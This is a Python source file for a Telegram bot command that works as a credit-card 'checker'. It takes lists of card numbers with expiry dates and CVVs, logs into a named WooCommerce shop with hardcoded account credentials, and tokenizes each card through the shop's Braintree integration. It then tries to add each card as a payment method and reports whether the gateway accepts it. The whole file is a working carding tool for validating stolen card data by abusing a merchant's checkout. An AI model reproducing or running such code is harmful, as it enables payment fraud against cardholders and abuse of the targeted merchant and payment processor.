import requests
import time
import re
import base64  # Add this import statement
from bs4 import BeautifulSoup

def process_nonsk2_command(bot, message):
    chat_id = message.chat.id
    card_details = message.text.split()[1:]  # Get the card details from the command
    if card_details:
        total_cards = len(card_details)
        start_time = time.time()
        results = []
        initial_message = "↯ NONSK2 CHECKER\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_cards, start_time, message.from_user.username))

        for card in card_details:
            result = check_nonsk2(card)
            results.append(f"Card: {card}\nResponse => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_cards, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide card details in the format: /nonsk2 cc|mm|yy|cvc")

def check_nonsk2(card):
    try:
        cc, mes, ano, cvv = card.split('|')
        r = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        }
        response = r.get("https://www.woolroots.com/my-account/", headers=headers)
        login_nonce = re.findall(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
        if not login_nonce:
            return "Failed to find woocommerce-login-nonce. HTML content: " + response.text[:500]
        login_nonce = login_nonce[0]

        headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.woolroots.com',
            'Referer': 'https://www.woolroots.com/my-account/',
        })
        data = {
            'username': 'omyadav7777',
            'password': 'nxtvenom1122@',
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }
        response = r.post('https://www.woolroots.com/my-account/', headers=headers, data=data)

        headers.update({
            'Referer': 'https://www.woolroots.com/my-account/add-payment-method/',
        })
        response = r.get('https://www.woolroots.com/my-account/add-payment-method/', headers=headers)
        client_token_nonce = re.findall(r'"client_token_nonce":"(.*?)"', response.text)
        if not client_token_nonce:
            return "Failed to find client_token_nonce. HTML content: " + response.text[:500]
        client_token_nonce = client_token_nonce[0]

        headers.update({
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
        })
        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_token_nonce,
        }
        response = r.post('https://www.woolroots.com/wp-admin/admin-ajax.php', headers=headers, data=data)
        token = re.findall(r'"data":"(.*?)"', response.text)
        if not token:
            return "Failed to find token. HTML content: " + response.text[:500]
        token = token[0]

        decoded_text = base64.b64decode(token).decode('utf-8')
        authorization_fingerprint = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)
        if not authorization_fingerprint:
            return "Failed to find authorizationFingerprint. Decoded text: " + decoded_text[:500]
        authorization_fingerprint = authorization_fingerprint[0]

        headers.update({
            'authorization': f'Bearer {authorization_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
        })
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '89d615c6-0350-481e-a35e-863af6c62f3e',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        token = response.json().get('data', {}).get('tokenizeCreditCard', {}).get('token')
        if not token:
            return "Failed to get token from Braintree response. JSON response: " + str(response.json())

        headers.update({
            'Referer': 'https://www.woolroots.com/my-account/add-payment-method/',
        })
        response = r.get('https://www.woolroots.com/my-account/add-payment-method/', headers=headers)
        payment_nonce = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
        if not payment_nonce:
            return "Failed to find woocommerce-add-payment-method-nonce. HTML content: " + response.text[:500]
        payment_nonce = payment_nonce[0]

        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': token,
            'wc_braintree_device_data': '{"correlation_id":"5d4a458e9fb8b6cd05da33e61448f27a"}',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': payment_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        time.sleep(25)
        response = r.post('https://www.woolroots.com/my-account/add-payment-method/', headers=headers, data=data)
        soup = BeautifulSoup(response.text, 'html.parser')
        try:
            msg = soup.find('i', class_='nm-font nm-font-close').parent.text.strip()
        except:
            return "Status code avs: Gateway Rejected: avs"
        try:
            if "Status code avs: Gateway Rejected: avs" in msg:
                return msg
        except:
            return "Status code avs:"
        else:
            return msg
    except Exception as e:
        return f"An error occurred: {str(e)}"

def get_footer_info(total_cards, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"🔹 Total Cards Checked - {total_cards}\n"
        f"⏱️ Time Taken - {elapsed_time:.2f} seconds\n"
        f"▫️ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
